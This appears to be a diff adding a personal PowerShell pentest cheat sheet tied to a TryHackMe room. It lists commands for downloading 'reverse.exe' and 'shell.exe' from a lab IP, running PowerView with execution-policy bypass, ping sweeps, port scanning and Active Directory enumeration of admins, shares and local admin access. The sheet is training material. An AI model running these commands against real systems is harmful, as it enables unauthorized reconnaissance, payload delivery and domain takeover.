@@ -1,0 +1,64 @@
+### powershell enum ###
+## links ##
+https://tryhackme.com/room/powershellforpentesters
+
+
+## files ##
+Start-Process notepad.exe						# start process
+Get-Process -name notepad						# list runing processes
+Get-Process | Export-Csv proc.csv					# export list un csv
+Get-Content .\proc.csv							# cat
+Copy-Item .\proc.csv test.csv						# cp
+Move-item								# mv
+Get-FileHash -Algorithm MD5 .\test.csv					# get hash
+
+
+## Download file ##
+Invoke-WebRequest http://10.8.98.114/reverse.exe -Outfile reverse.exe
+(New-Object System.Net.WebClient).Downloadfile('http://10.8.98.114:80/shell.exe','shell.exe')
+# exec
+powershell -ExecutionPolicy Bypass -File .\powerview.ps1
+# exec
+Set-ExecutionPolicy Bypass -Scope Process
+	.\powerview.ps1
+
+
+
+## Recon ##
+Get-Hotfix								# list installed patches
+Get-Hotfix | Format-list | findstr InstalledOn				# list and grep
+Get-Hotfix | Format-Table HotFixID
+Get-Hotfix | Out-File hot.txt						# redirect output
+dir | Format-List *							# listing very verbose
+Get-Process | Out-Gridview						# output as a GUI grid view
+
+
+## network recon ##
+# scan network
+1..255 | %{echo "10.0.2.$_"; ping -n 1 10.0.2.$_ | Select-String ttl}
+# scan port 
+1..1024 | %{echo ((New-object Net.sockets.tcpclient).connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null
+
+
+## powerview ##
+Import-Module .\powerview.ps1
+Get-NetDomainController							# info on DC
+(Get-Netuser).name							# list domain user
+(get-netuser).useraccountcontrol					# check disabled/enable account
+Get-netuser | select -ExpandProperty lastlogin
+Get-Netcomputer								# system connected to domain
+get-netcomputer -ping							# to check which are online
+get-netgroup								# list domain group
+get-netgroupmember "Domain Admins"					# list user inside a domain group
+find-domainshare -CheckShareAccess					# list readable shares
+get-netgpo								# list group policy
+get-netdomaintrust							# list domain you may access
+get-netusers -domain sub.name.local
+find-localadminaccess							# list systems you may access as local admin
+
+
+
+
+
+
+
